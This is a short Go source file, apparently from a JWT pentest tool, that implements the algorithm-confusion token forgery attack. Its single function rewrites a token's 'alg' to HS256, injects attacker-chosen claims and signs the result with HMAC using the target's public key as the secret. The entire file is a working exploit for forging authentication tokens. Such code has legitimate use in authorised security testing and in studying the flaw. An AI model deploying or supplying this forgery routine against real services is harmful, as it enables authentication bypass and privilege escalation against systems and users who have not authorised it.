package jwt

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

func ConfusionAtack(tokenString string, newPayload map[string]interface{}, publicKeyPEM string) (string, error) {
	token, err := ParseToken(tokenString)
	if err != nil {
		return "", fmt.Errorf("failed to parse token: %v", err)
	}

	token.Header["alg"] = "HS256"
	for key, value := range newPayload {
		token.Payload[key] = value
	}

	headerBytes, err := json.Marshal(token.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %v", err)
	}

	payloadBytes, err := json.Marshal(token.Payload)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %v", err)
	}

	headerEncoded := base64.RawURLEncoding.EncodeToString(headerBytes)
	payloadEncoded := base64.RawURLEncoding.EncodeToString(payloadBytes)
	signingInput := fmt.Sprintf("%s.%s", headerEncoded, payloadEncoded)

	mac := hmac.New(sha256.New, []byte(publicKeyPEM))
	_, _ = mac.Write([]byte(signingInput))
	signature := mac.Sum(nil)

	signatureEncoded := base64.RawURLEncoding.EncodeToString(signature)
	newTokenString := fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, signatureEncoded)
	return newTokenString, nil
}
